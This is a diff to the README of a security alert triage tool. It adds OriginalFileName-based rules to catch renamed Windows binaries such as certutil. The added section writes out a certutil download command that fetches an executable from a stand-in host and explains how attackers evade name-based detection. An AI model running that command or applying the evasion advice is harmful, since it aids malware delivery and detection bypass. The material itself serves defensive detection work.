@@ -48,6 +48,7 @@ python cli.py alerts/benign_admin.json        # signed admin script from Program
 python cli.py alerts/xss_probe.json           # HTML/JS payloads in every field, for testing the web app → malicious
 python cli.py alerts/ocsf_clipboard_stager.json  # OCSF export: char-shifted loader that runs the clipboard → malicious
 python cli.py alerts/s1_threat_sample.json       # SentinelOne API response with 3 threats: one card each, then a summary
+python cli.py alerts/renamed_certutil.json       # certutil copied to cu.exe, caught by its PE header name → malicious
 ```
 
 ### OCSF alerts
@@ -132,7 +133,7 @@ Rules live in [`rules/behavior_rules.yaml`](rules/behavior_rules.yaml) and are v
             regex: '^"?([a-z]:\\([^"\\]+\\)*)?(cmd|powershell|...)(\.exe)?"?(\s|$)'
 ```
 
-Conditions can check `command_line`, `file_path`, `parent_process`, and `image` (the process file name, taken from `file_path` or the start of the command line). Regexes are case-insensitive. Before matching, text is deobfuscated: carets (`^`) and empty quote pairs (`""`) are removed and whitespace is collapsed.
+Conditions can check `command_line`, `file_path`, `parent_process`, `image` (the process file name, taken from `file_path` or the start of the command line), and `original_file_name` (the OriginalFileName from the PE header, as a file name). A condition with `differs_from: image` only matches when the two names differ (case-insensitive, a missing `.exe` ignored). Regexes are case-insensitive. Before matching, text is deobfuscated: carets (`^`) and empty quote pairs (`""`) are removed and whitespace is collapsed.
 
 **Encoded PowerShell:** when a PowerShell command line uses `-EncodedCommand` (or `-e`, `-enc`, ...), the base64 is decoded as UTF-16LE (falling back to UTF-8) and the rules run again on the decoded script. The decoded text appears in the output. It is size-capped and never executed.
 
@@ -145,6 +146,19 @@ python scripts/update_attack.py
 ```
 
 A test checks that every technique ID in the rules file exists in that data.
+
+### Evasion I found in my own rules, and the fix
+
+**The bypass.** Every rule about a specific program recognised it by name: `\bcertutil(\.exe)?\b` in the command line, or `^rundll32\.exe$` as the image. Copy `certutil.exe` to `C:\Users\Public\cu.exe`, run `cu.exe -urlcache -f http://payload.example/a.exe a.exe`, and nothing fires. The download is identical, but the rules only see the name on disk, and the attacker picks that name.
+
+**Why OriginalFileName beats it.** A Windows executable carries a version resource inside the file, and one of its fields is `OriginalFileName` (`CertUtil.exe`, `MSHTA.EXE`, `REGSVR32.EXE`). Renaming or copying the file doesn't touch it, because it lives in the file's bytes, not the filesystem entry. EDRs read it and report it next to the image path. Alerts now have an optional `original_file_name`, and the rules use it two ways:
+
+- The LOLBin rules (certutil, mshta, regsvr32, rundll32, procdump, PowerShell) identify the program by its name on disk **or** its original file name, with an `any_of` around just that check. The rest of each rule is unchanged, so `cu.exe -urlcache` is still a certutil download.
+- A new rule, **Renamed system binary** (T1036.003 Masquerading: Rename Legitimate Utilities, tactic Stealth, high), fires when the original file name is a known Windows or Sysinternals tool but the image name differs. Legitimate software almost never renames a system binary, so the rename is a finding in itself. It compares file names only and case-insensitively, so `CertUtil.exe` vs `certutil.exe` isn't a rename. It also ignores a missing `.exe`, because Sysinternals' resource says just `procdump`. With no `original_file_name`, nothing changes: the old name-based matching applies as before.
+
+`alerts/renamed_certutil.json` is that exact case. It fires both the certutil rule (through the original name) and the renamed-binary rule, and it comes back malicious.
+
+**What it still misses.** `OriginalFileName` is only as honest as the file that carries it. An attacker who compiles their own downloader can write any version resource they like: call it `notepad.exe`, or leave it out entirely, and neither the name rules nor the rename rule has anything to catch. Copying the real certutil is caught because Microsoft's resource is in it, and that's exactly what an attacker who brings their own binary avoids. That's why hash reputation (VirusTotal) still matters next to behavior rules: a freshly built binary has no good reputation, and a known tool has a known hash. Signatures help too. A file that claims to be `CertUtil.exe` but isn't signed by Microsoft is lying, and that check belongs on the list of next steps.
 
 ## Cache
 
